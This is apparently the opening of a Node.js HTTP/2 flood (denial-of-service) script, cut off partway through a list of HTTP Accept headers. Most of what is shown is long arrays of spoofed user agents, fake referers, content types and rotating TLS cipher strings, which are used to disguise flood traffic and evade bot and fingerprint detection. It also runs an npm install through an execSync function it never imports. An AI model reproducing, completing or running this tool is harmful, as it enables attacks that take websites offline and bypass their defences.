const url = require("url");
const fs = require('fs');
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const request = require("request");
const cluster = require("cluster");
const randstr = require('randomstring');
const crypto = require("crypto");
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const randomString = crypto.randomBytes(0x14).toString("hex");
const secretKey = crypto.randomBytes(0x20);
var ciphe = crypto.createCipheriv("aes-256-cbc", secretKey, crypto.randomBytes(0x10));
let encrypted = ciphe.update(randomString, "utf8", "hex");
encrypted += ciphe.final("hex");
const bytes = crypto.randomBytes(0x10);
const xAuthToken = bytes.toString("hex");
try {
  var colors = require("colors");
} catch (_0x574cb7) {
  console.log("[36mInstalling[37m the requirements");
  execSync("npm install colors");
  console.log("Done.");
  process.exit();
}
const uap = ["POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "portalmmm/2.0 N410i(c20;TB) ", 'Python-urllib/2.5', "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", 'SearchExpress', "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61", "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "HTC_HD2_T8585 Opera/9.70 (Windows NT 5.1; U; de)", "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Opera/5.0 (compatible; Windows NT 6.9; en-us) Gecko/20180224 Chrome/35.1.271.187 Safari/592.28", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const type = ["text/plain", 'text/html', "application/json", "application/xml", "multipart/form-data", "application/octet-stream", "image/jpeg", "image/png", "audio/mpeg", "video/mp4", "application/javascript", "application/pdf", "application/vnd.ms-excel", "application/vnd.ms-powerpoint", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/zip", 'image/gif', "image/bmp", "image/tiff", "audio/wav", "audio/midi", "video/avi", "video/mpeg", "video/quicktime", "text/csv", "text/xml", "text/css", "text/javascript", "application/graphql", "application/x-www-form-urlencoded", "application/vnd.api+json", "application/ld+json", "application/x-pkcs12", "application/x-pkcs7-certificates", "application/x-pkcs7-certreqresp", "application/x-pem-file", "application/x-x509-ca-cert", "application/x-x509-user-cert", "application/x-x509-server-cert", "application/x-bzip", "application/x-gzip", "application/x-7z-compressed", "application/x-rar-compressed", "application/x-shockwave-flash"];
const referer = ["https://www.google.com", "https://www.facebook.com", "https://www.twitter.com", "https://www.youtube.com", 'https://www.amazon.com', "https://www.netflix.com", "https://www.instagram.com", "https://www.yahoo.com", "https://www.stackoverflow.com", "https://www.github.com", "https://www.linkedin.com", "https://www.cnn.com", "https://www.apple.com", "https://www.microsoft.com", "https://www.wikipedia.org", "https://www.nytimes.com", 'https://www.msn.com', "https://www.reddit.com", "https://www.quora.com", "https://www.npr.org", "https://www.bbc.com", "https://www.theguardian.com", "https://www.huffingtonpost.com", "https://www.washingtonpost.com", "https://www.wsj.com", "https://www.bloomberg.com", "https://www.cnbc.com", "https://www.merriam-webster.com", "https://www.dictionary.com", "https://www.thedailybeast.com", "https://www.thedailyshow.com", "https://www.colbertnation.com", "https://www.nationalgeographic.com", "https://www.nasa.gov", "https://www.nypl.org", "https://www.britannica.com", "https://www.healthline.com", "https://www.webmd.com", "https://www.mayoclinic.org", "https://www.cdc.gov", "https://www.nih.gov", "https://www.medlineplus.gov", "https://www.cancer.gov", "https://www.fda.gov", "https://www.nature.com", "https://www.sciencemag.org", "https://www.scientificamerican.com", "https://www.who.int", "https://www.un.org", "https://www.worldbank.org", "https://www.imf.org", "https://www.wto.org", "https://www.oecd.org", "https://www.europa.eu", "https://www.nato.int", "https://www.icrc.org", "https://www.amnesty.org", "https://www.hrw.org", 'https://www.greenpeace.org', "https://www.oxfam.org", "https://www.doctorswithoutborders.org", "https://www.unicef.org", "https://www.savethechildren.org", "https://www.redcross.org", "https://www.wikipedia.org", "https://www.wikimedia.org", "https://www.mozilla.org", "https://www.apache.org", "https://www.mysql.com", "https://www.php.net", "https://www.python.org", "https://www.ruby-lang.org", "https://www.jquery.com", "https://www.reactjs.org", "https://www.angularjs.org", "https://www.vuejs.org", "https://www.bootstrap.com", "https://www.materializecss.com", "https://www.sass-lang.com", "https://www.lesscss.org", "https://www.d3js.org", "https://www.highcharts.com", "https://www.chartjs.org", "https://www.mapbox.com", "https://www.mapboxgl-js.com", "https://www.openstreetmap.org", "https://www.mapbox.com", "https://www.mapboxgl-js.com", 'https://www.chartjs.org', "https://www.highcharts.com", "https://www.d3js.org", "https://www.lesscss.org", "https://www.sass-lang.com", 'https://www.materializecss.com', "https://www.bootstrap.com", "https://www.vuejs.org", "https://www.angularjs.org", "https://www.reactjs.org", "https://www.jquery.com", "https://www.ruby-lang.org", "https://www.python.org", "https://www.php.net", "https://www.mysql.com", "https://www.apache.org", "https://www.mozilla.org", "https://www.wikimedia.org", "https://www.wikipedia.org", "https://www.redcross.org", "https://www.savethechildren.org", "https://www.unicef.org", "https://www.doctorswithoutborders.org", "https://www.oxfam.org", "https://www.greenpeace.org", "https://www.hrw.org", "https://www.amnesty.org", "https://www.icrc.org", "https://www.nato.int", "https://www.europa.eu", "https://www.oecd.org", "https://www.wto.org", "https://www.imf.org", "https://www.worldbank.org", "https://www.un.org", 'https://www.who.int', "https://www.scientificamerican.com", "https://www.sciencemag.org", "https://www.nature.com", "https://www.fda.gov", "https://www.cancer.gov", 'https://www.medlineplus.gov', "https://www.nih.gov", "https://www.cdc.gov", "https://www.mayoclinic.org", "https://www.webmd.com", "https://www.healthline.com", "https://www.britannica.com", "https://www.nypl.org", "https://www.nasa.gov", "https://www.nationalgeographic.com", 'https://www.colbertnation.com', 'https://www.thedailyshow.com', 'https://www.thedailybeast.com', "https://www.dictionary.com", "https://www.merriam-webster.com", "https://www.cnbc.com", "https://www.bloomberg.com", "https://www.wsj.com", "https://www.washingtonpost.com", "https://www.huffingtonpost.com", "https://www.theguardian.com", "https://www.bbc.com", "https://www.npr.org", "https://www.quora.com", "https://www.reddit.com", "https://www.msn.com", "https://www.nytimes.com", "https://www.wikipedia.org", "https://www.microsoft.com", "https://www.apple.com", "https://www.cnn.com", "https://www.linkedin.com", "https://www.github.com", "https://www.stackoverflow.com", "https://www.yahoo.com", "https://www.instagram.com", "https://www.netflix.com", "https://www.amazon.com", "https://www.youtube.com", "https://www.twitter.com", "https://www.facebook.com", "https://www.google.com"];
const platform = ['Windows', "Windows Phone", "Macintosh", "Linux", "iOS", "Android", "PlayStation 4", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", "Roku", 'Chromecast', "Smart TV", "Other"];
cplist = ["RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384", "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384", "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384", "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384", 'TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", 'AES256-SHA256', "AES256-SHA", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL', "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", 